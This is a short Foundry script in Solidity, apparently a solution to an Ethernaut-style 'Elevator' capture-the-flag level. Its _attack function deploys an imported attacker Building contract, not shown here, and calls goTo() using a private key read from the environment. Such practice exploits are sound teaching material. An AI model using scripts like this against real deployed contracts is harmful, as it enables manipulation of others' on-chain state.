// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {Building} from "src/Building.sol";

contract ElevatorScript is Script {
    uint256 deployerPrivateKey;

    function setUp() public {
        deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    }

    function run() public {
        vm.startBroadcast(deployerPrivateKey);
        _attack();
        vm.stopBroadcast();
    }

    function _attack() public {
        Building building = new Building();
        building.goTo();
    }
}
